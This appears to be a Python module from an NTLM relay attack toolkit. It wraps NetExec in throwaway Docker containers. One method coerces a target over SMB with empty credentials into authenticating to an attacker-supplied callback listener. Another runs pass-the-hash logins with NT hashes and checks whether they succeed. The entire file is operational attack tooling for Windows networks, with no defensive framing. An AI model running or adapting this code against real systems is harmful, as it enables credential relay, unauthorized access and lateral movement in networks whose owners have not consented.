"""Controller for ephemeral NetExec Docker containers."""
from __future__ import annotations

from pathlib import Path
from typing import Any, Dict, List, Optional

from btc_relay_module_nxc_impckt.config import AppConfig
from btc_relay_module_nxc_impckt.logger import get_logger
from btc_relay_module_nxc_impckt.utils.docker_helpers import ensure_image, get_client, run_ephemeral

logger = get_logger()


class NxcController:
    """Runs nxc commands inside ephemeral Docker containers."""

    def __init__(self, cfg: AppConfig) -> None:
        self.cfg = cfg
        self.client = get_client()
        ensure_image(self.client, self.cfg.docker.netexec_image)

    def coerce(
        self,
        target: str,
        method: str,
        callback_host: str,
    ) -> tuple[bool, str]:
        """Run nxc coerce module against target."""
        # NXC coerce syntax varies; common pattern:
        # nxc smb <target> -u '' -p '' -M coerce -o LISTENER=<callback>
        cmd = [
            "smb",
            target,
            "-u", "''",
            "-p", "''",
            "-M", "coerce",
            "-o", f"LISTENER={callback_host}",
        ]
        logger.info(f"[nxc coerce] {method} -> {target}")
        try:
            stdout = self._run(cmd)
            success = "coerced" in stdout.lower() or "success" in stdout.lower()
            return success, stdout
        except Exception as exc:
            logger.exception(f"nxc coerce failed on {target}")
            return False, str(exc)

    def post_auth(
        self,
        protocol: str,
        target: str,
        username: str,
        nthash: str,
        domain: str = ".",
        extra_args: Optional[List[str]] = None,
    ) -> tuple[bool, str]:
        """Run nxc post-auth check."""
        cmd: List[str] = [protocol, target]
        if username:
            cmd += ["-u", username]
        if nthash:
            cmd += ["-H", nthash]
        if domain and domain != ".":
            cmd += ["-d", domain]
        if extra_args:
            cmd.extend(extra_args)

        logger.info(f"[nxc post-auth] {protocol} {target} as {domain}\\{username}")
        try:
            stdout = self._run(cmd)
            # nxc returns "[+]" on success, "[-]" on failure
            success = "[+]" in stdout
            return success, stdout
        except Exception as exc:
            logger.exception(f"nxc post-auth failed on {target}")
            return False, str(exc)

    def _run(self, cmd: List[str]) -> str:
        volumes: Dict[str, Dict[str, str]] = {}
        # If targets or wordlists exist in cwd, mount them read-only
        cwd = Path.cwd()
        volumes[str(cwd)] = {"bind": "/workspace", "mode": "ro"}

        return run_ephemeral(
            self.client,
            image=self.cfg.docker.netexec_image,
            command=cmd,
            network_mode=self.cfg.docker.network_mode,
            volumes=volumes,
            working_dir="/workspace",
        )
